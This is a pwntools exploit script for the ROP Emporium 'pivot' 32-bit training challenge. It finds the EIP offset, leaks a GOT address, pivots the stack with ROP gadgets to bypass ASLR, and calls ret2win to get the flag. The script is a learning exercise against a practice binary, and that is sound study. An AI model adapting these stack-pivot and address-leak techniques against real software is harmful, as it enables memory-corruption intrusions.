# This writeup helped me understand the techniques used in this challenge, check it out:
# https://github.com/AidanFray/ROP_Emporium/tree/master/0x06_pivot/32-bit

from pwn import *
import re

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './pivot32'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


def find_eip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', "")  # We need to deal with initial prompt
    # Then we can send payload (when it asks for stack smash)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP at the time of crashing
    eip_offset = cyclic_find(p.corefile.eip)
    info('located EIP offset at {a}'.format(a=eip_offset))
    # Return the EIP offset
    return eip_offset


# Pass in pattern_size, get back EIP offset
eip_offset = find_eip(cyclic(100))

# Start program
io = start()

# pprint(elf.got)
# pprint(elf.plt)

# Pointers to GOT/PLT functions
foothold_plt = elf.plt.foothold_function
foothold_got = elf.got.foothold_function
puts_plt = elf.plt.puts

# Get out pivot address (this changes each time)
pivot_addr = int(re.search(r"(0x[\w\d]+)", io.recvS()).group(0), 16)

# Offsets of the libpivot32 functions we want
foothold_offset = 0x77d
ret2win_offset = 0x974

# Our stack pivot
pop_eax = 0x0804882c  # pop eax; ret;
xchg_eax_esp = 0x0804882e  # xchg eax, esp; ret;

# Print out important addresses
info("foothold_plt: %#x", foothold_plt)
info("foothold_got: %#x", foothold_got)
info("puts_plt: %#x", puts_plt)
info("pivot_addr: %#x", pivot_addr)
info("foothold_offset: %#x", foothold_offset)
info("ret2win_offset: %#x", ret2win_offset)
info("pop eax; ret; %#x", pop_eax)
info("xchg eax, esp; ret; %#x", xchg_eax_esp)

# Our first payload to leak the foothold_function@got address
payload = flat(
    # Need to call foothold_plt to populate GOT with function address
    foothold_plt,
    # Call puts to leak the foothold_got address
    puts_plt,
    elf.symbols.main,  # Exit address (we want to return here)
    foothold_got
)

# Send payload 1 to leak the address
info("Sending first payload to leak foothold_function@got address")
io.sendline(payload)

# Our second payload to pivot to address we were given at beginning (where our payload 1 was injected)
payload2 = flat(
    asm('nop') * eip_offset,  # Offset - 44 bytes
    pop_eax,
    pivot_addr,
    xchg_eax_esp
)

# Send payload 2 to pivot
info("Sending second payload to stack pivot")
io.sendlineafter('>', payload2)

# Receive text until beginning of leaked address
io.recvlines(2)
# Extract and convert leaked address
leaked_got_addresses = io.recv()
foothold_leak = unpack(leaked_got_addresses[:4].strip())
# Calculate offset to ret2win function
libpivot32_base = foothold_leak - foothold_offset
ret2win_addr = libpivot32_base + ret2win_offset

# Print out for confirmation
info("Leaked foothold_function@got:")
info("foothold_leak: %#x", foothold_leak)
info("libpivot32_base: %#x", libpivot32_base)
info("ret2win_addr: %#x", ret2win_addr)

# Our third (and final) payload to retrieve out flag
payload3 = flat(
    asm('nop') * eip_offset,  # Offset - 44 bytes
    ret2win_addr
)

# gdb.attach(io, gdbscript='init-pwndbg')

# Send payload 3 to ret2win
io.sendline(payload3)
io.recvuntil('Thank you!\n')

# Get our flag!
flag = io.recv()
success(flag)
